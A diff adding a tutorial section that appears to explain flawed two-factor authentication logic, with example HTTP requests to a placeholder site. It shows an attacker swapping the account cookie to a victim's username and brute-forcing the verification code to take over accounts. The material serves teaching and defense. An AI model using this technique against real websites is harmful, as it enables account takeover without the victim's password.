@@ -32,4 +32,58 @@ It is also important to note that the full benefits of multi-factor authenticati
 - If the login process prompts for a password first, then a verification code on a separate page, the user may be considered "logged in" after the first step.
 - In such cases, test if you can access authenticated pages directly after entering the password, without completing the second step.
 - Occasionally, websites do not properly check if the second authentication step was completed before granting access to protected resources.
-+
+
+## Flawed Two-Factor Verification Logic
+
+Sometimes, flawed logic in two-factor authentication means that after a user completes the initial login step, the website doesn't adequately verify that the same user is completing the second step.
+
+### Example Flow
+
+1. **User logs in with credentials:**
+
+   ```http
+   POST /login-steps/first HTTP/1.1
+   Host: vulnerable-website.com
+   ...
+   username=carlos&password=qwerty
+   ```
+
+   The server responds:
+
+   ```http
+   HTTP/1.1 200 OK
+   Set-Cookie: account=carlos
+   ```
+
+2. **User proceeds to the second step:**
+
+   ```http
+   GET /login-steps/second HTTP/1.1
+   Cookie: account=carlos
+   ```
+
+3. **User submits the verification code:**
+   ```http
+   POST /login-steps/second HTTP/1.1
+   Host: vulnerable-website.com
+   Cookie: account=carlos
+   ...
+   verification-code=123456
+   ```
+
+### The Vulnerability
+
+- The website uses the cookie value to determine which account is being verified.
+- An attacker can log in with their own credentials, then change the cookie to target any username:
+  ```http
+  POST /login-steps/second HTTP/1.1
+  Host: vulnerable-website.com
+  Cookie: account=victim-user
+  ...
+  verification-code=123456
+  ```
+- If the attacker can brute-force the verification code, they can access any account without knowing the password.
+
+### Impact
+
+This flaw is extremely dangerous. It allows attackers to log in to arbitrary accounts by manipulating cookies and brute-forcing codes, without ever needing the victim's password.
